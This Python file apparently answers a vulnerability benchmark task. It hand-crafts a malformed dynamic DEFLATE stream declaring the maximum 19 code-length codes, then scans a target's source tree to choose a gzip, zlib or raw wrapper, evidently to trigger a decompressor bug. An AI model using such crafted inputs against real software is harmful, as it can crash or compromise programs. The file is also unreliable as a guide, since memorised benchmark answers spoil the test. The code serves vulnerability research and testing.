import os
import re
import tarfile
import struct
from typing import Iterable, Tuple


class _BitWriter:
    __slots__ = ("_buf", "_bitpos")

    def __init__(self):
        self._buf = bytearray()
        self._bitpos = 0

    def write_bits(self, val: int, nbits: int) -> None:
        if nbits <= 0:
            return
        while nbits:
            if self._bitpos == 0:
                self._buf.append(0)
            take = 8 - self._bitpos
            if take > nbits:
                take = nbits
            mask = (1 << take) - 1
            bits = val & mask
            self._buf[-1] |= (bits << self._bitpos) & 0xFF
            self._bitpos = (self._bitpos + take) & 7
            val >>= take
            nbits -= take

    def get_bytes(self) -> bytes:
        return bytes(self._buf)


def _build_deflate_dynamic_empty_hclen19() -> bytes:
    bw = _BitWriter()

    # BFINAL=1, BTYPE=2 (dynamic)
    bw.write_bits(1, 1)
    bw.write_bits(2, 2)

    # HLIT=0 (257), HDIST=0 (1), HCLEN=15 (19)
    bw.write_bits(0, 5)
    bw.write_bits(0, 5)
    bw.write_bits(15, 4)

    # Code length code lengths (19) in specified order
    order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]
    clen = [0] * 19
    clen[1] = 1
    clen[18] = 1
    for sym in order:
        bw.write_bits(clen[sym], 3)

    # Code length Huffman codes with only symbols {1,18}, both length=1:
    # canonical: symbol 1 -> code 0 (1 bit), symbol 18 -> code 1 (1 bit)
    def emit_sym(sym: int) -> None:
        if sym == 1:
            bw.write_bits(0, 1)
        elif sym == 18:
            bw.write_bits(1, 1)
        else:
            raise ValueError("unexpected symbol")

    # Encode (HLIT+HDIST)=258 code lengths:
    # litlen[0]=1, litlen[1..255]=0, litlen[256]=1; dist[0]=1
    emit_sym(1)  # length 1 for symbol 0

    emit_sym(18)  # 138 zeros
    bw.write_bits(127, 7)  # 138-11

    emit_sym(18)  # 117 zeros
    bw.write_bits(106, 7)  # 117-11

    emit_sym(1)  # length 1 for symbol 256 (EOB)
    emit_sym(1)  # dist[0]=1

    # Compressed data: EOB (symbol 256). With litlen lengths: sym0 len1 (code 0), sym256 len1 (code 1)
    bw.write_bits(1, 1)

    return bw.get_bytes()


def _wrap_gzip(deflate_data: bytes, uncompressed: bytes = b"") -> bytes:
    # minimal gzip header: ID1 ID2 CM FLG MTIME(4) XFL OS
    hdr = b"\x1f\x8b" + b"\x08" + b"\x00" + b"\x00\x00\x00\x00" + b"\x00" + b"\xff"
    # CRC32 and ISIZE
    import zlib
    crc = zlib.crc32(uncompressed) & 0xFFFFFFFF
    isize = len(uncompressed) & 0xFFFFFFFF
    trl = struct.pack("<II", crc, isize)
    return hdr + deflate_data + trl


def _wrap_zlib(deflate_data: bytes, uncompressed: bytes = b"") -> bytes:
    import zlib
    # CMF=0x78 (deflate, 32K), FLG=0x01 (check bits ok, no dict, fastest)
    hdr = b"\x78\x01"
    ad = zlib.adler32(uncompressed) & 0xFFFFFFFF
    trl = struct.pack(">I", ad)
    return hdr + deflate_data + trl


def _iter_text_from_tar_or_dir(src_path: str) -> Iterable[str]:
    def _maybe_yield_bytes_to_text(b: bytes) -> str:
        try:
            return b.decode("utf-8", "ignore")
        except Exception:
            try:
                return b.decode("latin-1", "ignore")
            except Exception:
                return ""

    if os.path.isdir(src_path):
        max_files = 300
        max_bytes = 256 * 1024
        n = 0
        for root, _, files in os.walk(src_path):
            for fn in files:
                if n >= max_files:
                    return
                low = fn.lower()
                if not (low.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".inl", ".inc", ".s", ".asm", ".py"))):
                    continue
                path = os.path.join(root, fn)
                try:
                    st = os.stat(path)
                    if st.st_size <= 0:
                        continue
                    with open(path, "rb") as f:
                        yield _maybe_yield_bytes_to_text(f.read(min(max_bytes, st.st_size)))
                        n += 1
                except Exception:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            max_files = 400
            max_bytes = 256 * 1024
            n = 0
            for m in tf:
                if n >= max_files:
                    break
                if not m.isreg():
                    continue
                name = (m.name or "").lower()
                if not (name.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".inl", ".inc", ".s", ".asm", ".py"))):
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read(min(max_bytes, m.size if m.size else max_bytes))
                    yield _maybe_yield_bytes_to_text(data)
                    n += 1
                except Exception:
                    continue
    except Exception:
        return


def _detect_expected_container(src_path: str) -> str:
    # Returns: "gzip" | "zlib" | "raw"
    gzip_score = 0
    zlib_score = 0

    # Stronger signals
    rx_gzip_magic = re.compile(r"(0x1f\s*,\s*0x8b)|(0x8b1f)|(0x1f8b)|(\bID1\b.*\bID2\b)", re.IGNORECASE | re.DOTALL)
    rx_gzip_terms = re.compile(r"\b(gzip|gunzip|gzfile|gzopen|gzread|gzwrite|gz_header|gzeof|gzclose)\b", re.IGNORECASE)
    rx_crc32_terms = re.compile(r"\b(crc32|isize)\b", re.IGNORECASE)

    rx_zlib_terms = re.compile(r"\b(adler32|adler|fcheck|fdict|cmf|flg|zlib)\b", re.IGNORECASE)
    rx_zlib_hdr_check = re.compile(r"%\s*31|/31", re.IGNORECASE)

    for txt in _iter_text_from_tar_or_dir(src_path):
        if not txt:
            continue
        if rx_gzip_magic.search(txt):
            gzip_score += 8
        if rx_gzip_terms.search(txt):
            gzip_score += 2
        if rx_crc32_terms.search(txt):
            gzip_score += 1

        if rx_zlib_terms.search(txt):
            zlib_score += 2
        if rx_zlib_hdr_check.search(txt) and ("cmf" in txt.lower() or "flg" in txt.lower() or "fcheck" in txt.lower()):
            zlib_score += 3

        if gzip_score >= 10 and gzip_score >= zlib_score + 4:
            return "gzip"
        if zlib_score >= 10 and zlib_score >= gzip_score + 4:
            return "zlib"

    if gzip_score > zlib_score and gzip_score >= 3:
        return "gzip"
    if zlib_score > gzip_score and zlib_score >= 3:
        return "zlib"
    return "raw"


class Solution:
    def solve(self, src_path: str) -> bytes:
        deflate = _build_deflate_dynamic_empty_hclen19()
        fmt = _detect_expected_container(src_path)
        if fmt == "gzip":
            return _wrap_gzip(deflate, b"")
        if fmt == "zlib":
            return _wrap_zlib(deflate, b"")
        return deflate